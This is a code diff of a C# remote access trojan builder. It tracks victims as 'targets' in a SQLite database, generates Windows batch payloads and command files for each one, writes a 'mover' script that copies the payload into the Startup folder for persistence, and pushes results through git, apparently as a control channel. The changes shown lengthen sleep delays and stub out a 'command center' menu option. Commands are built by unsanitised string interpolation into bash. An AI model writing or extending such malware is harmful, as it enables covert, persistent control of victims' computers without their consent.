@@ -13,6 +13,10 @@ void shell_exec(string command) {
 	System.Diagnostics.Process.Start("/bin/bash", $"-c \"{command}\"");
 }
 
+void command_center() {
+	
+}
+
 void save_target(string target_name, string rat_file, string cmd_file) {
 	var connection = new SqliteConnection("Data Source=rat.db");
 	try {
@@ -59,11 +63,11 @@ void view_targets() {
 void generate_rat(string target, string file, string command) {
 	// CREATE A DIRECTORY FOR THE TARGET
 	shell_exec($"mkdir {target}"); // CREATES DIR FOR THE TARGET
-	Thread.Sleep(3);
+	Thread.Sleep(3000);
 	System.Diagnostics.Process.Start("/bin/bash", $"-c \"touch {target}/{file}.bat\""); // CREATES EMPTY BATCH FILE
-	Thread.Sleep(3);
+	Thread.Sleep(3000);
 	System.Diagnostics.Process.Start("/bin/bash", $"-c \"touch {target}/{target}.txt\""); // CREATES EMPTY COMMAND TXT FILE
-	Thread.Sleep(3);
+	Thread.Sleep(3000);
 	string file_path = target + "/" + file + ".bat";
 	string command_file = target + "/" + target + ".txt"; // THE INITIAL CMD COMMAND IS STORED HERE
 	File.AppendAllText(file_path, "@echo off\n");	
@@ -84,7 +88,7 @@ void generate_rat(string target, string file, string command) {
 void generate_mover(string file, string target) {
 	string file_path = $"{target}/mover.bat";
 	shell_exec($"touch {file_path}"); // CREATES EMPTY MOVER FILE
-	Thread.Sleep(3);
+	Thread.Sleep(3000);
 	File.AppendAllText(file_path, "@echo off\n");
 	File.AppendAllText(file_path, $"set \"source=%~dp0{file}.bat\"\n");
 	File.AppendAllText(file_path, "set \"startup=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n");
@@ -95,8 +99,11 @@ void generate_mover(string file, string target) {
 
 void push_changes() {
 	shell_exec("git add .");
+	Thread.Sleep(3000);
 	shell_exec("git commit -m \"Program Commit\"");
+	Thread.Sleep(3000);
 	shell_exec("git push");
+	Thread.Sleep(3000);
 }
 
 // MAIN
@@ -132,7 +139,7 @@ while (true) {
     	view_targets();
 
     } else if (opn == "3") {
-
+	command_center();
     } else {
          return;
     } 
